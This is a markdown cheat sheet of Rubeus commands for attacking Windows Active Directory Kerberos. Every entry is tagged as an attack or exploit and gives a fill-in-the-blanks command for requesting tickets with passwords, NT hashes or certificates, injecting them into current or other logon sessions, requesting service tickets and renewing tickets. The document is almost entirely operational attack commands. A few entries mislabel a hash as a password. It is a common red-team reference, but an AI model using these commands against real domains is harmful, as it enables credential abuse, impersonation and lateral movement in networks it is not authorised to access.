# rubeus

% ad, windows, rubeus

#plateform/windows #target/local 


## asktgt - (cred)
/rc4, /aes128, /aes256, /des
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /password:<password> /nowrap
```

## asktgt - (pth)
/rc4, /aes128, /aes256, /des
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /rc4:<nt_hash> /nowrap
```

## asktgt - (cert)
/rc4, /aes128, /aes256, /des
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /dc:<dc_name> /getcredentials /certificate:<file_or_b64> /password:<pfx_password> /nowrap
```

## asktgt - and inject in current session (cred)
/rc4, /aes128, /aes256, /des
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /password:<nt_hash> /nowrap /ptt
```

## asktgt - and inject in current session (pth)
/rc4, /aes128, /aes256, /des
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /rc4:<nt_hash> /nowrap /ptt
```

## asktgt - and inject in another session (cred)
/rc4, /aes128, /aes256, /des
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /password:<nt_hash> /nowrap /ptt /luid:<luid>
```

## asktgt - and inject in another session (pth)
/rc4, /aes128, /aes256, /des
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /rc4:<nt_hash> /nowrap /ptt /luid:<luid>
```

## asktgt - TGT from nt_hash and inject ticket (pth)
#cat/ATTACK/CONNECT 
```
.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /rc4:<nt_hash> /nowrap /ptt
```

## asktgs -  ptt (current session)
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgs /ticket:<kirbi_path_or_b64_blob> /service:<spn_comma_sep_list> /nowrap /ptt
```

## asktgs - ptt other dc/domain (current session)
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgs /ticket:<kirbi_path_or_b64_blob> /service:<spn_comma_sep_list> /dc:<dst_dc_fqdn> /nowrap /ptt
```

## asktgs - ptt (other session)
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgs /ticket:<kirbi_path_or_b64_blob> /service:<spn_comma_sep_list> /nowrap /ptt /luid:<luid>
```

## renew - and inject  
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe renew /ticket:<kirbi_path_or_b64_blob> /nowrap /ptt
```

## renew - autorenew and inject 
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe renew /ticket:<kirbi_path_or_b64_blob> /nowrap /ptt /autorenew
```